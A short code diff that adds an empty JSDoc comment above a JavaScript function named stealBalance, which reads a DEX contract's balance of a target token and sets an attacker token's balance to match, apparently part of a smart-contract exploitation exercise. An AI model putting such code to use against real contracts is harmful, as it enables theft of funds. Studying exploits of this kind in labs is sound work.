@@ -41,6 +41,12 @@ Runner.run(async () => {
     console.log("* * * ");
 });
 
+/**
+ * 
+ * @param {*} dex 
+ * @param {*} attackToken 
+ * @param {*} targetToken 
+ */
 async function stealBalance(dex, attackToken, targetToken) {
     const amount = await targetToken.balanceOf(dex.address);
     await attackToken.setBalance(amount); 
